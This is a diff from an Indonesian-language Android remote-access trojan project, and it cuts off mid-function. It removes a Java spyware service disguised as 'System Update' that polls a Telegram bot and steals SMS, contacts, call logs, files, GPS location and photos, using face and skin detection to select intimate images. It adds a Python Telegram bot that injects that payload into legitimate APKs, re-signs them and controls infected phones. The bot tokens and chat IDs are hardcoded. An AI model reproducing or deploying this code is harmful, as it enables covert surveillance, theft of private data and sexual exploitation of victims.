@@ -1,520 +1,382 @@
-package com.system.update;
+import os
+import subprocess
+import logging
+import shutil
+import uuid
+import zipfile
+import xml.etree.ElementTree as ET
+import urllib.request
+import json
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-import android.app.Activity;
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.app.Service;
-import android.content.ContentValues;
-import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.net.Uri;
-import android.os.Build;
-import android.os.Environment;
-import android.os.IBinder;
-import android.provider.MediaStore;
-import android.provider.Settings;
-import android.database.Cursor;
-import android.provider.ContactsContract;
-import android.provider.CallLog;
-import android.hardware.Camera;
-import android.location.Location;
-import android.location.LocationManager;
-import android.content.Context;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
-import android.graphics.Color;
-import android.media.FaceDetector;
-import android.media.MediaMetadataRetriever;
+# ── KONFIGURASI ──
+TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo" 
+PAYLOAD_BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"
+PAYLOAD_BOT_USERNAME = "Hasil_rat_bot"
 
-import java.io.BufferedReader;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.io.OutputStream;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.DataOutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.net.URLEncoder;
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.util.Collections;
-import java.util.List;
-import java.util.concurrent.TimeUnit;
+ALLOWED_CHAT_ID = "8598136412" 
+GROUP_ID = "-1004405270823" 
 
-public class Payload extends Service {
-    private String BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"; 
-    private String CHAT_ID = "8598136412"; 
-    private String GROUP_ID = "-1004405270823"; 
+WORK_DIR = "/data/data/com.termux/files/home/r4t" 
+KEYSTORE_PATH = f"{WORK_DIR}/app_debug.keystore"
+KEYSTORE_PASS = "123456"
+KEY_ALIAS = "debugkey"
+PAYLOAD_SMALI_DIR = f"{WORK_DIR}/payload_smali/com/system/update"
+DEVICES_FILE = f"{WORK_DIR}/devices.json"
+
+os.makedirs(WORK_DIR, exist_ok=True)
+logging.disable(logging.CRITICAL)
+user_states = {} 
+
+def is_authorized(update: Update):
+    return str(update.effective_chat.id) == ALLOWED_CHAT_ID
+
+def load_devices():
+    if not os.path.exists(DEVICES_FILE): return []
+    try:
+        with open(DEVICES_FILE, "r") as f: return json.load(f)
+    except: return []
+
+def save_devices(devices):
+    with open(DEVICES_FILE, "w") as f: json.dump(devices, f)
+
+def ensure_keystore():
+    if not os.path.exists(KEYSTORE_PATH):
+        cmd = (f"keytool -genkey -v -keystore '{KEYSTORE_PATH}' -alias {KEY_ALIAS} "
+               f"-keyalg RSA -keysize 2048 -validity 10000 -storepass {KEYSTORE_PASS} "
+               f"-keypass {KEYSTORE_PASS} -dname \"CN=Android Debug,O=Android,C=US\"")
+        try: subprocess.run(cmd, shell=True, check=True, capture_output=True)
+        except: pass
+
+def inject_manifest(manifest_path):
+    tree = ET.parse(manifest_path)
+    root = tree.getroot()
+    ns = '{http://schemas.android.com/apk/res/android}'
     
-    private long lastUpdateId = 0;
-    private String myAndroidId = "";
-    private android.content.SharedPreferences prefs;
+    permissions = [
+        "android.permission.INTERNET", "android.permission.READ_SMS", "android.permission.RECEIVE_SMS", 
+        "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG", "android.permission.CAMERA", 
+        "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", 
+        "android.permission.ACCESS_FINE_LOCATION", "android.permission.RECEIVE_BOOT_COMPLETED", 
+        "android.permission.FOREGROUND_SERVICE", "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
+        "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "android.permission.POST_NOTIFICATIONS",
+        "android.permission.SCHEDULE_EXACT_ALARM", "android.permission.USE_EXACT_ALARM", 
+        "android.permission.WAKE_LOCK", "android.permission.MANAGE_EXTERNAL_STORAGE"
+    ]
+                   
+    for perm in permissions:
+        if not any(p.get(ns + 'name') == perm for p in root.findall('uses-permission')):
+            ET.SubElement(root, 'uses-permission', {ns + 'name': perm})
 
-    private void writeLog(String msg) {
-        try {
-            File file = new File(getExternalFilesDir(null), "rat_debug.txt");
-            java.io.FileOutputStream fos = new java.io.FileOutputStream(file, true);
-            fos.write((new java.util.Date().toString() + " - " + msg + "\n").getBytes());
-            fos.close();
-        } catch (Exception e) {}
-    }
-
-    public static void askPermissions(Activity activity) {
-        if (Build.VERSION.SDK_INT >= 23) {
-            List<String> permissions = new ArrayList<>();
-            String[] perms = {
-                "android.permission.READ_SMS", "android.permission.RECEIVE_SMS",
-                "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG",
-                "android.permission.CAMERA", "android.permission.ACCESS_FINE_LOCATION",
-                "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"
-            };
-            for (String p : perms) {
-                if (activity.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
-                    permissions.add(p);
-                }
-            }
-            if (Build.VERSION.SDK_INT >= 33) {
-                if (activity.checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
-                    permissions.add("android.permission.POST_NOTIFICATIONS");
-                }
-            }
-            if (!permissions.isEmpty()) {
-                activity.requestPermissions(permissions.toArray(new String[0]), 101);
-            }
+    app = root.find('application')
+    if app is not None:
+        if not any(s.get(ns + 'name') == 'com.system.update.Payload' for s in app.findall('service')):
+            ET.SubElement(app, 'service', {ns + 'name': 'com.system.update.Payload', ns + 'enabled': 'true', ns + 'exported': 'false', ns + 'foregroundServiceType': 'dataSync'})
             
-            if (Build.VERSION.SDK_INT >= 30) {
-                if (!Environment.isExternalStorageManager()) {
-                    try {
-                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
-                        intent.setData(Uri.parse("package:" + activity.getPackageName()));
-                        activity.startActivity(intent);
-                    } catch (Exception e) {}
-                }
-            }
-            
-            try {
-                Intent intent = new Intent();
-                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                intent.setData(Uri.parse("package:" + activity.getPackageName()));
-                activity.startActivity(intent);
-            } catch (Exception e) {}
-        }
-    }
+        if not any(r.get(ns + 'name') == 'com.system.update.BootReceiver' for r in app.findall('receiver')):
+            r1 = ET.SubElement(app, 'receiver', {ns + 'name': 'com.system.update.BootReceiver', ns + 'enabled': 'true', ns + 'exported': 'true'})
+            ET.SubElement(r1, 'intent-filter').append(ET.Element('action', {ns + 'name': 'android.intent.action.BOOT_COMPLETED'}))
 
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        prefs = getSharedPreferences("rat_prefs", MODE_PRIVATE);
-        lastUpdateId = prefs.getLong("lastUpdateId", 0);
-        myAndroidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        if not any(r.get(ns + 'name') == 'com.system.update.AlarmReceiver' for r in app.findall('receiver')):
+            ET.SubElement(app, 'receiver', {ns + 'name': 'com.system.update.AlarmReceiver', ns + 'enabled': 'true', ns + 'exported': 'false'})
 
-        writeLog("1. Service Start (Alarm)");
-        
-        if (Build.VERSION.SDK_INT >= 26) {
-            String CHANNEL_ID = "sys_update_channel";
-            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
-            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            if (manager != null) manager.createNotificationChannel(channel);
+    tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
 
-            Notification notification = new Notification.Builder(this, CHANNEL_ID)
-                    .setContentTitle("System Update")
-                    .setContentText("Checking...")
-                    .setSmallIcon(android.R.drawable.ic_popup_sync)
-                    .build();
-            startForeground(1, notification);
-        }
+def inject_permission_popup(apk_out_dir):
+    manifest_path = f"{apk_out_dir}/AndroidManifest.xml"
+    tree = ET.parse(manifest_path)
+    root = tree.getroot()
+    ns = '{http://schemas.android.com/apk/res/android}'
+    
+    main_activity_name = None
+    for activity in root.iter('activity'):
+        for intent_filter in activity.findall('intent-filter'):
+            actions = [a.get(ns + 'name') for a in intent_filter.findall('action')]
+            if "android.intent.action.MAIN" in actions:
+                main_activity_name = activity.get(ns + 'name')
+                break
+        if main_activity_name: break
 
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                writeLog("2. Thread Jalan");
-                String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
+    if not main_activity_name: return "❌ Gagal: MainActivity tidak ditemukan."
+    if main_activity_name.startswith("."): main_activity_name = main_activity_name[1:]
+    
+    smali_path = f"{apk_out_dir}/smali/{main_activity_name.replace('.', '/')}.smali"
+    if not os.path.exists(smali_path):
+        for i in range(2, 10):
+            alt_path = f"{apk_out_dir}/smali_classes{i}/{main_activity_name.replace('.', '/')}.smali"
+            if os.path.exists(alt_path): smali_path = alt_path; break
                 
-                sendCheckIn(deviceName);
+    if not os.path.exists(smali_path): return f"❌ Gagal: File {smali_path} tidak ditemukan."
 
-                writeLog("3. Masuk Fast Polling (3 Menit)");
-                long endTime = System.currentTimeMillis() + (180 * 1000); 
-                while (System.currentTimeMillis() < endTime) {
-                    checkCommands();
-                    try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) {}
-                }
+    with open(smali_path, "r", encoding="utf-8") as f: lines = f.readlines()
 
-                writeLog("4. Waktu Habis, Service Tidur");
-                stopForeground(true);
-                stopSelf();
-            }
-        }).start();
+    injected = False
+    for i, line in enumerate(lines):
+        if ".method" in line and "onCreate" in line and "Bundle" in line:
+            for j in range(i, i+15): 
+                if ".locals" in lines[j] or ".registers" in lines[j]:
+                    parts = lines[j].split()
+                    if len(parts) >= 2:
+                        if ".locals" in lines[j]: lines[j] = f"    .locals {int(parts[1]) + 5}\n"
+                        else: lines[j] = f"    .registers {int(parts[1]) + 5}\n"
+                        
+                        inject_code = (
+                            "\n    const-string v4, \"Injection Active\"\n"
+                            "    const/4 v5, 0x1\n"
+                            "    invoke-static {p0, v4, v5}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;\n"
+                            "    move-result-object v4\n"
+                            "    invoke-virtual {v4}, Landroid/widget/Toast;->show()V\n\n"
+                            "    invoke-static {p0}, Lcom/system/update/Payload;->askPermissions(Landroid/app/Activity;)V\n\n"
+                            "    invoke-static {p0}, Lcom/system/update/BootReceiver;->setAlarm(Landroid/content/Context;)V\n\n"
+                            "    new-instance v4, Landroid/content/Intent;\n"
+                            "    const-class v5, Lcom/system/update/Payload;\n"
+                            "    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n"
+                            "    invoke-virtual {p0, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
+                        )
+                        lines.insert(j + 1, inject_code)
+                        injected = True
+                    break
+        if injected: break
 
-        return START_NOT_STICKY;
-    }
+    if injected:
+        with open(smali_path, "w", encoding="utf-8") as f: f.writelines(lines)
+        return "✅ Pop-up, StartService & Alarm disuntikkan."
+    else: return "⚠️ Gagal nyuntik onCreate."
 
-    private String getParam(String json, String cmdPrefix) {
-        int idx = json.indexOf(cmdPrefix);
-        if (idx == -1) return null;
-        int start = idx + cmdPrefix.length();
-        int end = json.indexOf("\"", start);
-        if (end == -1) return null;
-        return json.substring(start, end).trim();
-    }
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update): return
+    chat_id = str(update.effective_chat.id)
+    user_states.pop(chat_id, None) 
+    banner = "```\n███╗   ███╗██████╗ ██╗  ██╗ ██╗ ██╗  ███╗  ███╗       ██╗██████╗ \n████╗ ████║██╔══██╗██║  ██║ ██║ ██║ ██╔██╗ ██╔██╗      ██║██╔══██╗\n██╔████╔██║██████╔╝███████║ ███████║██╔╝██╗██╔╝██╗     ██║██║  ██║\n██║╚██╔╝██║██╔══██╗╚════██║ ╚════██║██████╔╝██████╔╝   ██║██║  ██║\n██║ ╚═╝ ██║██║  ██║      ██║      ██║╚═██╔═╝╚═██╔═╝    ██║██████╔╝\n╚═╝     ╚═╝╚═╝  ╚═╝      ╚═╝      ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═════╝ \n```\n✨ **RAT BUILDER & CONTROLLER** ✨\nStatus: 🟢 Online\n\nSilakan pilih menu:"
+    keyboard = [[InlineKeyboardButton("📦 Build APK Baru", callback_data="menu_build")],[InlineKeyboardButton("📱 List Device Ter-Sadap", callback_data="menu_device")],[InlineKeyboardButton("💾 Backup Data (Pindah HP)", callback_data="menu_backup")]]
+    if update.callback_query: await update.callback_query.edit_message_text(banner, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+    else: await update.message.reply_text(banner, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
-    private void checkCommands() {
-        try {
-            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
-            URL url = new URL(urlStr);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("GET");
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    if not is_authorized(update): return
+    chat_id = str(update.effective_chat.id)
+    
+    if query.data == "menu_build":
+        user_states[chat_id] = "waiting_apk"
+        await query.edit_message_text("📦 **Build APK Baru**\n\nSilakan kirim file `.apk` asli.", parse_mode='Markdown')
+        
+    elif query.data == "menu_device":
+        devices = load_devices()
+        if not devices:
+            await query.edit_message_text("📱 **List Device Ter-Sadap**\n\nBelum ada device yang masuk.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")]]), parse_mode='Markdown')
+        else:
+            keyboard = []
+            for idx, dev in enumerate(devices[:5]):
+                keyboard.append([InlineKeyboardButton(f"📱 {dev['name']}", callback_data=f"device_{idx}")])
+            keyboard.append([InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")])
+            await query.edit_message_text(f"📱 **List Device Ter-Sadap ({len(devices)} HP)**\n\nPilih device:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+
+    elif query.data == "menu_backup":
+        await query.edit_message_text("⏳ Sedang membackup...")
+        zip_path = f"{WORK_DIR}/backup_r4t.zip"
+        try:
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for file in ["builder_bot.py", "app_debug.keystore", "devices.json"]:
+                    if os.path.exists(f"{WORK_DIR}/{file}"): zipf.write(f"{WORK_DIR}/{file}", file)
+                if os.path.exists(f"{WORK_DIR}/payload_smali"):
+                    for root, dirs, files in os.walk(f"{WORK_DIR}/payload_smali"):
+                        for file in files: zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), WORK_DIR))
+            with open(zip_path, "rb") as f: await context.bot.send_document(chat_id=chat_id, document=f, filename="backup_r4t.zip")
+            os.remove(zip_path)
+            await query.message.reply_text("✅ **Backup Berhasil!**")
+            await start(update, context)
+        except Exception as e: await query.message.reply_text(f"❌ Gagal Backup: {e}"); await start(update, context)
+        
+    elif query.data == "back_start": await start(update, context)
+        
+    elif query.data.startswith("device_"):
+        idx = int(query.data.split("_")[1])
+        devices = load_devices()
+        if idx < len(devices):
+            dev = devices[idx]
+            keyboard = [
+                [InlineKeyboardButton("📂 Cek File (Tree)", callback_data=f"cmd_tree_{idx}"), InlineKeyboardButton("📤 Send File", callback_data=f"cmd_send_file_{idx}")],
+                [InlineKeyboardButton("📩 Dump SMS (Full)", callback_data=f"cmd_dump_sms_{idx}"), InlineKeyboardButton("👥 Dump Kontak (Full)", callback_data=f"cmd_dump_kontak_{idx}")],
+                [InlineKeyboardButton("📞 Dump Telpon", callback_data=f"cmd_dump_telpon_{idx}"), InlineKeyboardButton("📍 Lacak Lokasi", callback_data=f"cmd_lacak_{idx}")],
+                [InlineKeyboardButton("📸 Foto Depan", callback_data=f"cmd_foto_depan_{idx}"), InlineKeyboardButton("📷 Foto Belakang", callback_data=f"cmd_foto_belakang_{idx}")],
+                [InlineKeyboardButton("📸 Foto Acak", callback_data=f"cmd_foto_acak_{idx}"), InlineKeyboardButton("👤 Foto Wajah", callback_data=f"cmd_foto_wajah_{idx}")],
+                [InlineKeyboardButton("👕 Foto Perut", callback_data=f"cmd_foto_perut_{idx}"), InlineKeyboardButton("🎥 Send Video", callback_data=f"cmd_send_video_{idx}")],
+                [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]
+            ]
+            await query.edit_message_text(f"🎮 **Kontrol: {dev['name']}**\nID: `{dev['id']}`\n\nPilih aksi (Kamu punya waktu 3 menit untuk respon instan):", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+
+    elif query.data.startswith("cmd_"):
+        parts = query.data.split("_")
+        idx = int(parts[-1])
+        cmd_base = "_".join(parts[1:-1])
+        
+        devices = load_devices()
+        if idx < len(devices):
+            dev_id = devices[idx]['id']
             
-            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-            StringBuilder response = new StringBuilder();
-            String line;
-            while ((line = in.readLine()) != null) { response.append(line); }
-            in.close();
-
-            String jsonResponse = response.toString();
+            if cmd_base == "tree":
+                perintah = f"/tree {dev_id}"
+                await kirim_perintah(query, perintah)
             
-            if (jsonResponse.contains("\"update_id\":")) {
-                int startIdx = jsonResponse.lastIndexOf("\"update_id\":") + 12;
-                int endIdx = jsonResponse.indexOf(",", startIdx);
-                if (endIdx == -1) endIdx = jsonResponse.indexOf("}", startIdx);
-                lastUpdateId = Long.parseLong(jsonResponse.substring(startIdx, endIdx).trim());
-                prefs.edit().putLong("lastUpdateId", lastUpdateId).apply();
-            }
+            elif cmd_base == "send_file":
+                user_states[chat_id] = f"waiting_path_send_file_{dev_id}"
+                await query.message.reply_text("📤 **Masukkan path file yang mau diambil.**\n\nContoh: `/storage/emulated/0/Download/file.pdf`", parse_mode='Markdown')
             
-            if (jsonResponse.contains("/tree " + myAndroidId)) {
-                writeLog("Membangun Tree...");
-                String tree = buildTree(new File("/storage/emulated/0/"), "", 0);
-                if (tree.length() > 3500) {
-                    saveAndSendText("tree.txt", tree, "📂 Tree Folder (File)");
-                } else {
-                    sendTelegramMessage("📂 *Tree Folder:*\n" + tree);
-                }
-            }
-            else if (jsonResponse.contains("/dump_sms " + myAndroidId)) { dumpSmsToFile(); }
-            else if (jsonResponse.contains("/dump_kontak " + myAndroidId)) { dumpContactsToFile(); }
-            else if (jsonResponse.contains("/dump_telpon " + myAndroidId)) { dumpCallLogsToFile(); }
-            else if (jsonResponse.contains("/foto_depan " + myAndroidId)) { takePhoto(1); }
-            else if (jsonResponse.contains("/foto_belakang " + myAndroidId)) { takePhoto(0); }
-            else if (jsonResponse.contains("/lacak " + myAndroidId)) { sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation()); }
-            else if (jsonResponse.contains("/send_file " + myAndroidId)) {
-                String param = getParam(jsonResponse, "/send_file " + myAndroidId + " ");
-                if (param != null) {
-                    File f = new File(param);
-                    if(f.exists()) sendTelegramFile(f.getAbsolutePath(), false, "📤 File: " + f.getName());
-                    else sendTelegramMessage("❌ File tidak ditemukan.");
-                }
-            }
-            else if (jsonResponse.contains("/send_foto_acak " + myAndroidId)) {
-                String param = getParam(jsonResponse, "/send_foto_acak " + myAndroidId + " ");
-                if (param != null) {
-                    String[] parts = param.split(" ");
-                    if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "acak");
-                }
-            }
-            else if (jsonResponse.contains("/send_foto_wajah " + myAndroidId)) {
-                String param = getParam(jsonResponse, "/send_foto_wajah " + myAndroidId + " ");
-                if (param != null) {
-                    String[] parts = param.split(" ");
-                    if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "wajah");
-                }
-            }
-            else if (jsonResponse.contains("/send_foto_perut " + myAndroidId)) {
-                String param = getParam(jsonResponse, "/send_foto_perut " + myAndroidId + " ");
-                if (param != null) {
-                    String[] parts = param.split(" ");
-                    if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "perut");
-                }
-            }
-            else if (jsonResponse.contains("/send_video " + myAndroidId)) {
-                String param = getParam(jsonResponse, "/send_video " + myAndroidId + " ");
-                if (param != null) {
-                    String[] parts = param.split(" ");
-                    if (parts.length >= 3) sendVideoFiltered(parts[0], Integer.parseInt(parts[1].trim()), Integer.parseInt(parts[2].trim()));
-                }
-            }
-
-        } catch (Exception e) { writeLog("Error checkCommands: " + e.getMessage()); }
-    }
-
-    private String buildTree(File dir, String prefix, int depth) {
-        if (depth > 15) return ""; 
-        StringBuilder sb = new StringBuilder();
-        File[] files = dir.listFiles();
-        if (files == null) return "";
-        Arrays.sort(files, (f1, f2) -> f1.getName().compareToIgnoreCase(f2.getName()));
-        for (File f : files) {
-            if (f.isDirectory()) {
-                String name = f.getName().toLowerCase();
-                if (name.equals("data") || name.equals("obb") || f.getName().startsWith(".")) continue;
-                sb.append(prefix).append("📁 ").append(f.getName()).append("\n");
-                sb.append(buildTree(f, prefix + "  ", depth + 1));
-            }
-        }
-        return sb.toString();
-    }
-
-    private void sendFotoFiltered(String path, int count, String mode) {
-        File dir = new File(path);
-        File[] files = dir.listFiles((d, name) -> name.toLowerCase().endsWith(".jpg") || name.toLowerCase().endsWith(".jpeg") || name.toLowerCase().endsWith(".png"));
-        if (files == null || files.length == 0) { sendTelegramMessage("❌ Folder kosong / tidak ada foto."); return; }
-        
-        List<File> fileList = new ArrayList<>(Arrays.asList(files));
-        Collections.shuffle(fileList);
-        
-        int sent = 0;
-        for (File f : fileList) {
-            if (sent >= count) break;
-            boolean lolos = false;
-            if (mode.equals("acak")) lolos = true;
-            else if (mode.equals("wajah")) lolos = detectFace(f.getAbsolutePath());
-            else if (mode.equals("perut")) lolos = detectSkin(f.getAbsolutePath());
-
-            if (lolos) {
-                sendTelegramFile(f.getAbsolutePath(), true, "📸 Foto " + mode.toUpperCase());
-                sent++;
-                try { TimeUnit.SECONDS.sleep(2); } catch (Exception e) {}
-            }
-        }
-        sendTelegramMessage("✅ Selesai scan " + mode + ". Terkirim " + sent + " foto.");
-    }
-
-    private boolean detectFace(String filePath) {
-        try {
-            BitmapFactory.Options options = new BitmapFactory.Options();
-            options.inPreferredConfig = Bitmap.Config.RGB_565;
-            Bitmap bitmap = BitmapFactory.decodeFile(filePath, options);
-            if (bitmap == null) return false;
-            FaceDetector detector = new FaceDetector(bitmap.getWidth(), bitmap.getHeight(), 5);
-            FaceDetector.Face[] faces = new FaceDetector.Face[5];
-            int numFaces = detector.findFaces(bitmap, faces);
-            bitmap.recycle();
-            return numFaces > 0;
-        } catch (Exception e) { return false; }
-    }
-
-    private boolean detectSkin(String filePath) {
-        try {
-            BitmapFactory.Options options = new BitmapFactory.Options();
-            options.inSampleSize = 4; 
-            Bitmap bitmap = BitmapFactory.decodeFile(filePath, options);
-            if (bitmap == null) return false;
-            int width = bitmap.getWidth();
-            int height = bitmap.getHeight();
-            int skinPixels = 0;
-            int totalPixels = 0;
-            for (int x = 0; x < width; x+=4) {
-                for (int y = 0; y < height; y+=4) {
-                    totalPixels++;
-                    int pixel = bitmap.getPixel(x, y);
-                    int r = Color.red(pixel), g = Color.green(pixel), b = Color.blue(pixel);
-                    if (r > 95 && g > 40 && b > 20 && (Math.max(r, Math.max(g, b)) - Math.min(r, Math.min(g, b))) > 15 && Math.abs(r - g) > 15 && r > g && r > b) {
-                        skinPixels++;
-                    }
-                }
-            }
-            bitmap.recycle();
-            return totalPixels > 0 && ((double) skinPixels / totalPixels) > 0.3;
-        } catch (Exception e) { return false; }
-    }
-
-    private void sendVideoFiltered(String path, int count, int maxSec) {
-        File dir = new File(path);
-        File[] files = dir.listFiles((d, name) -> name.toLowerCase().endsWith(".mp4") || name.toLowerCase().endsWith(".mkv") || name.toLowerCase().endsWith(".3gp"));
-        if (files == null || files.length == 0) { sendTelegramMessage("❌ Folder kosong / tidak ada video."); return; }
-        
-        List<File> fileList = new ArrayList<>(Arrays.asList(files));
-        Collections.shuffle(fileList);
-        
-        int sent = 0;
-        for (File f : fileList) {
-            if (sent >= count) break;
-            try {
-                MediaMetadataRetriever retriever = new MediaMetadataRetriever();
-                retriever.setDataSource(f.getAbsolutePath());
-                String time = retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
-                long timeMs = Long.parseLong(time);
-                retriever.release();
+            elif cmd_base in ["foto_acak", "foto_wajah", "foto_perut"]:
+                user_states[chat_id] = f"waiting_path_{cmd_base}_{dev_id}"
+                await query.message.reply_text("📂 **Masukkan path folder foto.**\n\nContoh: `/storage/emulated/0/DCIM/Camera`", parse_mode='Markdown')
                 
-                if ((timeMs / 1000) <= maxSec) {
-                    sendTelegramFile(f.getAbsolutePath(), false, "🎥 Video (" + (timeMs/1000) + "s)");
-                    sent++;
-                    try { TimeUnit.SECONDS.sleep(2); } catch (Exception e) {}
-                }
-            } catch (Exception e) {}
-        }
-        sendTelegramMessage("✅ Selesai scan video. Terkirim " + sent + " video.");
-    }
+            elif cmd_base == "send_video":
+                user_states[chat_id] = f"waiting_path_send_video_{dev_id}"
+                await query.message.reply_text("📂 **Masukkan path folder video.**\n\nContoh: `/storage/emulated/0/DCIM/Camera`", parse_mode='Markdown')
 
-    private void sendCheckIn(String deviceInfo) {
-        try {
-            String encoded = URLEncoder.encode("/checkin " + deviceInfo + "|" + myAndroidId, "UTF-8");
-            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + GROUP_ID + "&text=" + encoded;
-            new URL(urlStr).openConnection().getInputStream().close();
-        } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
-    }
+            else:
+                perintah = f"/{cmd_base} {dev_id}"
+                await kirim_perintah(query, perintah)
 
-    private void saveAndSendText(String filename, String content, String caption) {
-        try {
-            ContentValues values = new ContentValues();
-            values.put(MediaStore.MediaColumns.DISPLAY_NAME, filename);
-            values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
-            values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
-            
-            Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);
-            if (uri != null) {
-                OutputStream os = getContentResolver().openOutputStream(uri);
-                os.write(content.getBytes());
-                os.close();
-                
-                InputStream is = getContentResolver().openInputStream(uri);
-                sendTelegramFileStream(is, filename, false, caption);
-                
-                getContentResolver().delete(uri, null, null);
-            }
-        } catch (Exception e) {
-            writeLog("MediaStore Error: " + e.getMessage());
-        }
-    }
+async def kirim_perintah(query, perintah):
+    url_payload = f"https://t.me/{PAYLOAD_BOT_USERNAME}"
+    keyboard = [[InlineKeyboardButton("🚀 Buka Bot Payload & Kirim Perintah", url=url_payload)]]
+    await query.message.reply_text(f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\nBuka **Bot Payload**, lalu **KIRIM** teks ini:\n\n`{perintah}`\n\n*(Kirim dalam 3 menit untuk respon instan).*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
-    private void dumpSmsToFile() {
-        writeLog("Menyedot semua SMS...");
-        StringBuilder sb = new StringBuilder();
-        try {
-            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
-            if (cursor != null && cursor.moveToFirst()) {
-                do {
-                    sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex("address")))
-                      .append("\nTanggal: ").append(cursor.getString(cursor.getColumnIndex("date")))
-                      .append("\nPesan: ").append(cursor.getString(cursor.getColumnIndex("body"))).append("\n\n");
-                } while (cursor.moveToNext());
-                cursor.close();
-            }
-        } catch (Exception e) { writeLog("Gagal baca SMS"); }
-        saveAndSendText("sms_dump.txt", sb.toString(), "📩 Dump SEMUA SMS");
-    }
+async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_authorized(update): return
+    chat_id = str(update.effective_chat.id)
+    text = update.message.text.strip()
+    state = user_states.get(chat_id)
+    
+    if not state: return
 
-    private void dumpContactsToFile() {
-        writeLog("Menyedot semua Kontak...");
-        StringBuilder sb = new StringBuilder();
-        try {
-            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-            if (cursor != null && cursor.moveToFirst()) {
-                do {
-                    sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
-                      .append(" - ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
-                } while (cursor.moveToNext());
-                cursor.close();
-            }
-        } catch (Exception e) { writeLog("Gagal baca Kontak"); }
-        saveAndSendText("kontak_dump.txt", sb.toString(), "👥 Dump SEMUA Kontak");
-    }
+    if state.startswith("waiting_path_send_file_"):
+        dev_id = state.replace("waiting_path_send_file_", "")
+        perintah = f"/send_file {dev_id} {text}"
+        user_states.pop(chat_id, None)
+        await kirim_perintah(update.message, perintah)
 
-    private void dumpCallLogsToFile() {
-        writeLog("Menyedot semua Call Log...");
